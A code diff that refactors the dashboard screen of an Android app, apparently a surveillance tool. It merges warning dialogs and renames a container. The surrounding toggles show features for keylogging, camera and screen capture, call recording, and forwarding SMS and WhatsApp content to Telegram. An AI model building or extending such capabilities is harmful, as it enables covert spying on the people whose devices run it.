@@ -92,123 +92,12 @@ fun DashboardScreen(
             )
         }
 
-        // ── WhatsApp Not Available Warning Dialog ──
-        if (dashboardState.showWhatsAppWarningDialog) {
-            AlertDialog(
-                onDismissRequest = { onEvent(DashboardEvent.DismissWhatsAppWarningDialog) },
-                title = {
-                    Text(
-                        "WhatsApp Unavailable",
-                        color = MaterialTheme.colorScheme.error,
-                        fontWeight = androidx.compose.ui.text.font.FontWeight.SemiBold
-                    )
-                },
-                text = {
-                    Text(
-                        dashboardState.whatsAppWarningMessage,
-                        color = TextPrimary
-                    )
-                },
-                confirmButton = {
-                    Button(
-                        onClick = { onEvent(DashboardEvent.DismissWhatsAppWarningDialog) },
-                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
-                    ) {
-                        Text("OK", color = Color.White)
-                    }
-                },
-                containerColor = OuterCardSurface,
-                shape = RoundedCornerShape(24.dp)
-            )
-        }
-
-        // ── WhatsApp Business Not Available Warning Dialog ──
-        if (dashboardState.showWhatsAppBusinessWarningDialog) {
-            AlertDialog(
-                onDismissRequest = { onEvent(DashboardEvent.DismissWhatsAppBusinessWarningDialog) },
-                title = {
-                    Text(
-                        "WA Business Unavailable",
-                        color = MaterialTheme.colorScheme.error,
-                        fontWeight = androidx.compose.ui.text.font.FontWeight.SemiBold
-                    )
-                },
-                text = {
-                    Text(
-                        dashboardState.whatsAppBusinessWarningMessage,
-                        color = TextPrimary
-                    )
-                },
-                confirmButton = {
-                    Button(
-                        onClick = { onEvent(DashboardEvent.DismissWhatsAppBusinessWarningDialog) },
-                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
-                    ) {
-                        Text("OK", color = Color.White)
-                    }
-                },
-                containerColor = OuterCardSurface,
-                shape = RoundedCornerShape(24.dp)
-            )
-        }
-
-        // ── Instagram Not Available Warning Dialog ──
-        if (dashboardState.showInstagramWarningDialog) {
-            AlertDialog(
-                onDismissRequest = { onEvent(DashboardEvent.DismissInstagramWarningDialog) },
-                title = {
-                    Text(
-                        "Instagram Unavailable",
-                        color = MaterialTheme.colorScheme.error,
-                        fontWeight = androidx.compose.ui.text.font.FontWeight.SemiBold
-                    )
-                },
-                text = {
-                    Text(
-                        dashboardState.instagramWarningMessage,
-                        color = TextPrimary
-                    )
-                },
-                confirmButton = {
-                    Button(
-                        onClick = { onEvent(DashboardEvent.DismissInstagramWarningDialog) },
-                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
-                    ) {
-                        Text("OK", color = Color.White)
-                    }
-                },
-                containerColor = OuterCardSurface,
-                shape = RoundedCornerShape(24.dp)
-            )
-        }
-        
-        // ── Key Events Warning Dialog ──
-        if (dashboardState.showKeyEventsWarningDialog) {
-            AlertDialog(
-                onDismissRequest = { onEvent(DashboardEvent.DismissKeyEventsWarningDialog) },
-                title = {
-                    Text(
-                        "Key Events Notification",
-                        color = MaterialTheme.colorScheme.error,
-                        fontWeight = androidx.compose.ui.text.font.FontWeight.SemiBold
-                    )
-                },
-                text = {
-                    Text(
-                        dashboardState.keyEventsWarningMessage,
-                        color = TextPrimary
-                    )
-                },
-                confirmButton = {
-                    Button(
-                        onClick = { onEvent(DashboardEvent.DismissKeyEventsWarningDialog) },
-                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
-                    ) {
-                        Text("OK", color = Color.White)
-                    }
-                },
-                containerColor = OuterCardSurface,
-                shape = RoundedCornerShape(24.dp)
+        // ── Warning Dialogs ──
+        if (dashboardState.currentWarningTitle != null && dashboardState.currentWarningMessage != null) {
+            SuperiorWarningDialog(
+                title = dashboardState.currentWarningTitle,
+                message = dashboardState.currentWarningMessage,
+                onDismiss = { onEvent(DashboardEvent.DismissWarningDialog) }
             )
         }
 
@@ -217,12 +106,12 @@ fun DashboardScreen(
         OuterCard {
             SectionTitle("Service Status", Icons.Outlined.PlayCircle)
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 StatusRow("Bot Service", isServiceRunning, showDivider = true)
                 StatusRow("Telegram API", isTelegramApiReachable, showDivider = false)
             }
             Spacer(modifier = Modifier.height(8.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = if (isServiceRunning) "Service Running" else "Service Stopped",
                     checked = isServiceRunning,
@@ -259,7 +148,7 @@ fun DashboardScreen(
                     
                     val innerEnabled = isServiceRunning && dashboardState.persistentEnforcementEnabled
                     
-                    InnerListHost {
+                    SettingsCardContainer {
                         TactileToggleRow(
                             label = "Force Mobile Data",
                             subtitle = "Re-enable data if toggled off",
@@ -270,7 +159,7 @@ fun DashboardScreen(
                         )
                     }
                     Spacer(modifier = Modifier.height(8.dp))
-                    InnerListHost {
+                    SettingsCardContainer {
                         TactileToggleRow(
                             label = "Force Wi-Fi",
                             subtitle = "Re-enable Wi-Fi if toggled off",
@@ -281,7 +170,7 @@ fun DashboardScreen(
                         )
                     }
                     Spacer(modifier = Modifier.height(8.dp))
-                    InnerListHost {
+                    SettingsCardContainer {
                         TactileToggleRow(
                             label = "Force Hotspot",
                             subtitle = "Re-enable Hotspot if toggled off",
@@ -335,7 +224,7 @@ fun DashboardScreen(
                 )
             }
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "Screen Snapshots",
                     subtitle = "Enable periodic capture",
@@ -353,7 +242,7 @@ fun DashboardScreen(
                 }
             }
             Spacer(modifier = Modifier.height(8.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "Front Camera",
                     subtitle = "Periodically take a image at the scheduled interval.",
@@ -371,7 +260,7 @@ fun DashboardScreen(
                 }
             }
             Spacer(modifier = Modifier.height(8.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "Rear Camera",
                     subtitle = "Periodically take image at the scheduled interval.",
@@ -411,7 +300,7 @@ fun DashboardScreen(
                 )
             }
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "Call Recording",
                     subtitle = "Record and forward calls to Telegram",
@@ -424,7 +313,7 @@ fun DashboardScreen(
                 )
             }
             Spacer(modifier = Modifier.height(8.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "Call Events",
                     subtitle = "Notify on call events",
@@ -435,7 +324,7 @@ fun DashboardScreen(
                 )
             }
             Spacer(modifier = Modifier.height(8.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "SMS Events",
                     subtitle = "Notify on SMS events",
@@ -446,7 +335,7 @@ fun DashboardScreen(
                 )
             }
             Spacer(modifier = Modifier.height(8.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "Key Events",
                     subtitle = "Capture all typed text",
@@ -486,7 +375,7 @@ fun DashboardScreen(
                 )
             }
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 TactileToggleRow(
                     label = "WhatsApp",
                     subtitle = "Forward WhatsApp messages",
